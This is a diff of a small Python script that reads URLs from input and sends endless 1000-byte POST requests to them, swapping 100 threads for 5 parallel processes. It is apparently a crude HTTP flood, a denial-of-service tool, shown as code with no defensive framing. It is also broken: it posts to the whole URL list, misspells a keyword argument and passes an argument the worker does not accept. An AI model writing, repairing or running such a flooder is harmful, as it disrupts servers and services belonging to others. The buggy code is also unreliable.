@@ -1,22 +1,24 @@
 import requests as res
-import threading
+import multiprocessing
 
 vector = input("url:\n").split(" ")
 bye = bytes(10**3)
 
-def start():
+def http():
     while True:
         for i in vector:
             response = res.post(vector, data=bye, jason=None)
             print(response.text)
+            
 print("using post method to: ", vector)
 
-threads = []
+processes = []
 
-for i in range(100):
-    thread = threading.Thread(target=start)
-    thread.daemon = True  
-    threads.append(thread)
+for i in range(5):
+    p = multiprocessing.Process(target=http, args=(i,))
+    processes.append(p)
+    p.start()
 
-for i in range(100): 
-    threads[i].start()
+# Wait for all processes to complete
+for p in processes:
+    p.join()
